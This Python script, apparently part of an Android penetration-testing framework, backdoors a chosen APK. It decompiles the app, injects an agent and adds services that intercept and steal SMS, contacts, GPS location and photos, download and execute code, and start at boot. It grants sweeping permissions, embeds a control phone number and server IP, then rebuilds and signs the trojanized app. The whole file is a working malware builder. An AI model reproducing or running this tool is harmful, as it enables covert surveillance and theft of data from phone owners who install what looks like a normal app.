#!/usr/bin/python 
import os
import xml.etree.ElementTree as ET
import re
inputfile = raw_input('APK to Backdoor: ').strip()
apktoolloc = "/root/Smartphone-Pentest-Framework/apktool-install-linux-r05-ibot/apktool"
os.system(apktoolloc + " d " + inputfile)
path,file = os.path.split(inputfile)
foldername = file[:-4]
ET.register_namespace("android", "http://schemas.android.com/apk/res/android")
tree = ET.ElementTree()
tree.parse(foldername + "/AndroidManifest.xml")
root = tree.getroot()
package = root.get('package')
print package
for child in root:
     if child.tag == "application":
          app = child
          for child in app:
               if child.tag == "activity":
                    act = child
                    for child in act:
                         if child.tag == "intent-filter":
                              filter = child
                              for child in filter:  
                                   if (filter[0].get('{http://schemas.android.com/apk/res/android}name') == "android.intent.category.LAUNCHER" or  filter[0].get('{http://schemas.android.com/apk/res/android}name') == "android.intent.action.MAIN"):
                                        if (filter[1].get('{http://schemas.android.com/apk/res/android}name') == "android.intent.category.LAUNCHER" or  filter[1].get('{http://schemas.android.com/apk/res/android}name') == "android.intent.action.MAIN"):
                                             mainact =  act.get('{http://schemas.android.com/apk/res/android}name')
					     if mainact[0] == ".":
                                                  mainact = package + mainact
                                             print mainact
					     act.remove(filter)
                                             tree.write("output.xml")
					     break
os.system("mv output.xml " + foldername  + "/AndroidManifest.xml")
mainactsplit = mainact.split(".")
length = len(mainactsplit)
classname = mainactsplit[length - 1]
print classname
package = mainactsplit[0] + "."
for x in range(1, (length - 2)):
     add = mainactsplit[x] + "."
     package += add
package += mainactsplit[length - 2]
print package
appmain = package + "." + classname + ".class"
print appmain
mainfile = "AndroidAgent/src/com/bulbsecurity/framework/AndroidAgentActivity.java"
inject = "\n        Intent intent2 = new Intent(getApplicationContext(), " + appmain +  ");\nstartActivity(intent2);\n"
with open(mainfile, 'r') as f:
     fc = f.read()
with open(mainfile, 'w') as f:
     f.write(re.sub(r'(finish)', r'%s\1'%inject, fc, count=1))
newfolder = "src/" + mainactsplit[0] + "/"
os.system("mkdir AndroidAgent/" + newfolder)
for x in range(1, (length - 1)):
     add = mainactsplit[x] + "/"
     newfolder += add
     os.system("mkdir AndroidAgent/" + newfolder)  
fullclasspath =  "AndroidAgent/" + newfolder + classname + ".java"
os.system("touch " + fullclasspath)
f = open(fullclasspath, 'w')
line1 = "package " + package + ";\n"
line2 = "import android.app.Activity;\n"
line3 = "public class " + classname + " extends Activity {\n"
line4 = "}\n"
f.write(line1)
f.write(line2)
f.write(line3)
f.write(line4)
f.close()
os.system("android update project --name AndroidAgent --path AndroidAgent/")
os.system("ant -f AndroidAgent/build.xml clean debug")
os.system(apktoolloc + " d AndroidAgent/bin/AndroidAgent-debug.apk AndroidAgent2/")
os.system("mkdir " + foldername + "/smali/com")
os.system("cp -rf AndroidAgent2/smali/com/bulbsecurity " + foldername + "/smali/com/")
os.system("mkdir " + foldername + "/smali/jackpal")
os.system("cp -rf AndroidAgent2/smali/jackpal " + foldername + "/smali/")
manifestfile = foldername + "/AndroidManifest.xml"
inject = """
        <receiver android:name="com.bulbsecurity.framework.SMSReceiver">
        <intent-filter android:priority="999"><action android:name="android.provider.Telephony.SMS_RECEIVED" /></intent-filter>
        </receiver>
        <service android:name="com.bulbsecurity.framework.SMSService">
        </service>
        <receiver android:name="com.bulbsecurity.framework.ServiceAutoStarterr">
        <intent-filter ><action android:name="android.intent.action.BOOT_COMPLETED"></action></intent-filter>
        </receiver>
        <receiver android:name="com.bulbsecurity.framework.AlarmReceiver" android:process=":remote"></receiver>
        <service android:name="com.bulbsecurity.framework.CommandHandler">
        </service>
        <service android:name="com.bulbsecurity.framework.PingSweep">
        </service>
        <service android:name="com.bulbsecurity.framework.SMSGet">
        </service>
        <service android:name="com.bulbsecurity.framework.ContactsGet">
        </service>
        <service android:name="com.bulbsecurity.framework.InternetPoller">
        </service>
        <service android:name="com.bulbsecurity.framework.WebUploadService">
        </service>
        <service android:name="com.bulbsecurity.framework.PictureService">
        </service>
        <service android:name="com.bulbsecurity.framework.Download">
        </service>
        <service android:name="com.bulbsecurity.framework.Execute">
        </service>
        <service android:name="com.bulbsecurity.framework.GetGPS">
        </service>
        <service android:name="com.bulbsecurity.framework.Checkin">
        </service>
        <service android:name="com.bulbsecurity.framework.Listener"></service>
        <service android:name="com.bulbsecurity.framework.Phase1" android:process=":three">
        </service>
        <service android:name="com.bulbsecurity.framework.Phase2" android:process=":two">
        </service>
        <service android:name="com.bulbsecurity.framework.Exynos"></service>
        <service android:name="com.bulbsecurity.framework.Upload"></service>
        <activity android:name="com.bulbsecurity.framework.AndroidAgentActivity">
        <intent-filter>
        <action android:name="android.intent.action.MAIN" />
        <category android:name="android.intent.category.LAUNCHER" />
        </intent-filter>
        </activity>
"""
with open(manifestfile, 'r') as f:
      fc = f.read()
with open(manifestfile, 'w') as f:
      f.write(re.sub(r'(<\/application>)', r'%s\1'%inject, fc, count=1))
inject = """
        <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
        <uses-permission android:name="android.permission.INTERNET" />
        <uses-permission android:name="android.permission.RECEIVE_SMS"/>
        <uses-permission android:name="android.permission.SEND_SMS"/>
        <uses-permission android:name="android.permission.CAMERA"/>
        <uses-permission android:name="android.permission.READ_CONTACTS"/>
        <uses-permission android:name="android.permission.INTERNET"/>
        <uses-permission android:name="android.permission.READ_SMS"/>
        <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
        <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
        <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
        <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
        <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
        <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
"""
with open(manifestfile, 'r') as f:
     fc = f.read()
with open(manifestfile, 'w') as f:
     f.write(re.sub(r'(<uses-permission)', r'%s\1'%inject, fc, count=1))
stringfile = foldername + "/res/values/strings.xml" 
inject = """
        <string name="key">KEYKEY1</string>
        <string name="controlnumber">155552155554</string>
        <string name="controlIP">192.168.1.108</string>
        <string name="urii">/control</string>
        <string name="controlpath">/androidagent1</string>
"""
if os.path.exists(stringfile):
      with open(stringfile, 'r') as f:
           fc = f.read()
      with open(stringfile, 'w') as f:
           f.write(re.sub(r'(<\/resources>)', r'%s\1'%inject, fc, count=1))
else:
     inject2 = """
       <?xml version="1.0" encoding="utf-8"?>
       <resources>
     """
     os.system("touch " + stringfile)
     with open(stringfile, 'w') as f:
          f.write(inject2)  
          f.write(inject)
	  f.write("</resources>")
controlphone = raw_input('Phone number of the control modem for the agent: ').strip()
controlkey = raw_input('Control key for the agent: ').strip()
controlpath = raw_input('Webserver control path for agent: ').strip()
controlip = raw_input('Webserver control IP: ').strip()
os.system("sed -i \'s/<string name=\"key\">.*/<string name=\"key\">" + controlkey + "<\\/string>/' " + stringfile)
os.system("sed -i \'s/<string name=\"controlnumber\">.*/<string name=\"controlnumber\">" + controlphone + "<\\/string>/' " + stringfile)
os.system("sed -i \'s/<string name=\"controlIP\">.*/<string name=\"controlIP\">" + controlip + "<\\/string>/' " + stringfile)
os.system("sed -i \'s/<string name=\"controlip\">.*/<string name=\controlip\">" + controlip + "<\\/string>/' " + stringfile) 
xml_path = foldername + '/res/values/styles.xml'
if os.path.exists(xml_path):
     tree = ET.parse(xml_path)
     for child in tree.findall('.//*[@parent]'):
          if child.get('parent').startswith('@*android:style/'):
               new_parent = child.get('parent').replace('@*android:style/','@android:style/')
               child.set('parent', new_parent)
     tree.write(xml_path)
os.system(apktoolloc + " b " + foldername + " " + foldername + ".apk")
os.system("rm -rf " + foldername) 
os.system(apktoolloc + " d " + foldername + ".apk " + foldername + "/")
tree = ET.ElementTree()
tree.parse(foldername + "/res/values/public.xml")
root = tree.getroot()
for child in root:
     if (child.get('name') == "key" ):
          newkeyvalue = child.get('id')
     if (child.get('name') == "urii" ):
          newuriivalue = child.get('id')
     if (child.get('name') == "controlIP" ):
          newcontrolIPvalue = child.get('id')
     if (child.get('name') == "controlnumber" ):
          newcontrolnumbervalue = child.get('id')
     if (child.get('name') == "controlpath" ):
          newcontrolpathvalue = child.get('id')
oldkeyvalue = os.popen('cat ' + foldername + '/smali/com/bulbsecurity/framework/R\$string.smali | grep key | cut -d" " -f7').read().strip()
olduriivalue = os.popen('cat ' + foldername + '/smali/com/bulbsecurity/framework/R\$string.smali | grep urii | cut -d" " -f7').read().strip()
oldcontrolIPvalue = os.popen('cat ' + foldername + '/smali/com/bulbsecurity/framework/R\$string.smali | grep controlIP | cut -d" " -f7').read().strip()
oldcontrolpathvalue = os.popen('cat ' + foldername + '/smali/com/bulbsecurity/framework/R\$string.smali | grep controlpath | cut -d" " -f7').read().strip()
oldcontrolnumbervalue = os.popen('cat ' + foldername + '/smali/com/bulbsecurity/framework/R\$string.smali | grep controlnumber | cut -d" " -f7').read().strip()
for dname, dirs, files in os.walk(foldername + "/smali/com/bulbsecurity/framework"):
     for fname in files:
              fpath = os.path.join(dname, fname)
              with open(fpath) as f:
                    s = f.read()
                    s = s.replace(oldkeyvalue, newkeyvalue)
                    s = s.replace(olduriivalue, newuriivalue)
                    s = s.replace(oldcontrolIPvalue, newcontrolIPvalue)
                    s = s.replace(oldcontrolpathvalue, newcontrolpathvalue)
                    s = s.replace(oldcontrolnumbervalue, newcontrolnumbervalue)
              with open(fpath, "w") as f:
                    f.write(s)
xml_path = foldername + '/res/values/styles.xml'
if os.path.exists(xml_path):
     tree = ET.parse(xml_path)
     for child in tree.findall('.//*[@parent]'):
          if child.get('parent').startswith('@*android:style/'):
               new_parent = child.get('parent').replace('@*android:style/','@android:style/')
               child.set('parent', new_parent)
     tree.write(xml_path)
os.system("rm " + foldername + ".apk")
os.system(apktoolloc + " b " + foldername + " " + foldername + ".apk")
os.system("jarsigner -verbose -sigalg MD5withRSA -digestalg SHA1 -keystore /root/.android/debug.keystore " + foldername + ".apk " +  "androiddebugkey")
